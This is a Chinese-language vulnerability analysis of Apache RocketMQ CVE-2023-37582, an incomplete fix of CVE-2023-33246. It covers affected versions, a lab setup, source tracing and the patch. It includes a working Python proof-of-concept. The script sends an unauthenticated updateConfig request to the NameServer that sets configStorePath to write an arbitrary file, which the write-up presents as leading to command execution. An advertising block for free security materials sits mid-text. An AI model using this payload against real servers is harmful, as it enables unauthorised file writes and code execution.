![image](https://image.3001.net/images/20230801/1690850399_64c8545fc80c2092af9d6.png!small)​

## 漏洞简介

Apache RocketMQ是一款低延迟、高并发、高可用、高可靠的分布式消息中间件。CVE-2023-37582 中，由于对 CVE-2023-33246
修复不完善，导致在Apache RocketMQ NameServer
存在未授权访问的情况下，攻击者可构造恶意请求以RocketMQ运行的系统用户身份执行命令。

影响版本

Apache RocketMQ <= 5.1.1 Apache RocketMQ <= 4.9.6

## 环境搭建

参考 Apache RocketMQ 远程代码执行漏洞 CVE-2023-33246 的环境搭建

还是为了方便进行调试，我们再 linux 下搭建 RocketMQ 的相关服务，利用源码启动

一共需要运行两个服务

    
    
    org.apache.rocketmq.namesrv.NamesrvStartup  
    org.apache.rocketmq.broker.BrokerStartup

先启动 NamesrvStartup，再启动 BrokerStartup 同时都需要配置环境变量 ROCKETMQ_HOME
ROCKETMQ_HOME\=/home/ubuntu/Desktop/rocketmq-rocketmq-all-5.1.0

![image](https://image.3001.net/images/20230801/1690850401_64c85461939f85e2c2e9c.png!small)​

![image](https://image.3001.net/images/20230801/1690850402_64c85462bbcc6151dcf24.png!small)​

## 漏洞复现

运行 python 脚本

    
    
    import socket  
    import binascii  
    client = socket.socket()  
    ​  
    # you ip  
    client.connect(('192.168.222.130',9876))  
    ​  
    # data  
    json = '{"code":318,"flag":0,"language":"JAVA","opaque":266,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')  
    body='configStorePath=/tmp/test.txt\nproductEnvName=123\\ntest'.encode('utf-8')  
    json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2) # 一个字节是2个十六进制数  
    head1 = '00000000'+str(hex(json_lens))[2:]      # hex(xxxx) 0x1243434 去掉 0x  
    all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens)  
    head2 = '00000000'+str(hex(all_lens))[2:]  
    data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8')  
    ​  
    # send  
    client.send(bytes.fromhex(data))  
    data_recv = client.recv(1024)  
    print(data_recv)

![image](https://image.3001.net/images/20230801/1690850403_64c85463d9a049edc8672.png!small)​

![image](https://image.3001.net/images/20230801/1690850405_64c8546508633ecda834e.png!small)

成功在 tmp 目录下的 test.txt 文件中写入指定字符串 test

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 漏洞分析

`org/apache/rocketmq/remoting/protocol/RequestCode.java`​ code
代表调用不同的功能，此时调用的是318 更新配置的操作

`src/main/java/org/apache/rocketmq/remoting/protocol/RequestCode.java`​

![image](https://image.3001.net/images/20230801/1690850406_64c8546672f5e951c01d2.png!small)

根据对应的 code 会调用 对应的函数进行处理

`src/main/java/org/apache/rocketmq/namesrv/processor/DefaultRequestProcessor.java`​

![image](https://image.3001.net/images/20230801/1690850407_64c85467c256b5ac54d70.png!small)​

`src/main/java/org/apache/rocketmq/namesrv/processor/DefaultRequestProcessor.java#updateConfig`​

![image](https://image.3001.net/images/20230801/1690850408_64c85468cf819da344bcf.png!small)​​`src/main/java/org/apache/rocketmq/remoting/Configuration.java#update`​

![image](https://image.3001.net/images/20230801/1690850410_64c8546a3d3e88346d97f.png!small)​​

首先判断是不是属于可控的属性

`src/main/java/org/apache/rocketmq/remoting/Configuration.java#persist`​

![image](https://image.3001.net/images/20230801/1690850411_64c8546b747ff9e31cc31.png!small)​`src/main/java/org/apache/rocketmq/remoting/Configuration.java#getStorePath`​

![image](https://image.3001.net/images/20230801/1690850412_64c8546cb9e093329e66e.png!small)

调用 `getStorePath`​ 获取文件路径，此时获取的值是 configStorePath 的值

`src/main/java/org/apache/rocketmq/common/MixAll.java#string2File`​

![image](https://image.3001.net/images/20230801/1690850414_64c8546e9098bbec59f2c.png!small)​​`src/main/java/org/apache/rocketmq/common/MixAll.java#string2FileNotSafe`​

![image](https://image.3001.net/images/20230801/1690850415_64c8546fc71148d18ded9.png!small)​​`src/main/java/org/apache/rocketmq/common/utils/IOTinyUtils.java#writeStringToFile`​

![image](https://image.3001.net/images/20230801/1690850417_64c8547108c01be6d9731.png!small)​

## 漏洞修复

修改禁用修改配置路径的参数

![image](https://image.3001.net/images/20230801/1690850418_64c854720c13eb6bae006.png!small)
**更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**​

  

